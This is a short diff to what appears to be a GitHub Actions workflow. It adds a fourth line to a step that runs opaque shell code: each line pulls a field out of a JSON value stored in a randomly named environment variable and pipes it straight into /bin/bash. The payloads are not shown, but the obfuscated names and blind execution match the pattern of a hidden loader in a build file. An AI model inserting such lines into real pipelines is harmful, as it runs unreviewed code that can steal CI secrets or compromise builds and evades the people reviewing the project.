@@ -32,6 +32,7 @@ jobs:
           echo $vtzvl0 | jq -r .fuh68555 | /bin/bash
           echo $cw0 | jq -r .qs3241 | /bin/bash
           printf '%s' "$obzf650" | jq -r .r17 | /bin/bash
+          printf '%s' "$siw70" | jq -r .am064 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
